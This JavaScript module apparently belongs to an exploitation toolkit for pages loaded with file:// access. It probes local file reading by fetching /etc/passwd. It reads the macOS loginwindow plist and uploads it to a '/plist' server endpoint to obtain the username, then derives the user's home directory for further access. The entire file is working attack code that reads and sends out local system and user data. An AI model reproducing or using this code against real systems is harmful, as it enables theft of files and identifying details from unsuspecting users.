"use strict";


define(["utils", "platform"], function(utils, platform) {

    return {
        
        platform: platform,
        utils: utils,
    
        // Currently only detects unix-like file systems
        isFileSystemAccessbile: function(callbacks) {
            if (URL && location.origin) {
                var url = new URL(location.origin);
                if (url.protocol === 'file:' && callbacks.success) {
                    console.log('Looks like we are in a file:// origin');
                    callbacks.success();
                }
            }
            this.getFile('file:///etc/passwd', {
                success: function(data) {
                    if (data && callbacks.success) {
                        callbacks.success();
                    } else if (callbacks.failure) {
                        callbacks.failure();
                    }
                },
                failure: function() {
                    if (callbacks.failure) {
                        callbacks.failure();
                    }
                }
            });
        },

        getFile: function(filePath, callbacks, binary) {
            var fileReq = new XMLHttpRequest();
            fileReq.responseType = "arraybuffer";
            fileReq.onload = function() {
                if (fileReq.status === 200 && callbacks.success) {
                    callbacks.success(fileReq.response);
                } else if (callbacks.failure) {
                    callbacks.failure();
                }
 
            }
            console.log('Read file: ' + filePath);
            fileReq.open('GET', filePath, true);
            fileReq.send(null);
        },

        getMacOSUsername: function(callbacks) {
            var path = 'file:///Library/Preferences/com.apple.loginwindow.plist';
            var _this = this;
            this.getFile(path, {
                success: function(data) {
                    console.log('Got plist data, uploading to server ...');
                    _this.utils.POST('/plist', data, {
                        success: function(username) {
                            console.log('Username is: ' + username);
                            if (callbacks.success) {
                                callbacks.success(username);
                            }
                        },
                        failure: function() {
                            console.log('Server failed to parse plist data');
                            if (callbacks.failure) {
                                callbacks.failure();
                            }
                        }
                    });
                },
                failure: function() {
                    console.log('Failed to get file data for: ' + path);
                    callbacks.failure();
                }
            });
        },

        getHomeDirectory: function(callbacks) {
            var _this = this;
            this.getMacOSUsername({
                success: function(username) {
                    var os = _this.platform.operatingSystem();
                    if (os === 'macos' && callbacks.success) {
                        console.log('Determined home directory: /Users/' + username);
                        callbacks.success('file:///Users/' + username);
                    } else if (callbacks.failure) {
                        callbacks.failure();
                    }
                }
            });
        }
    }
});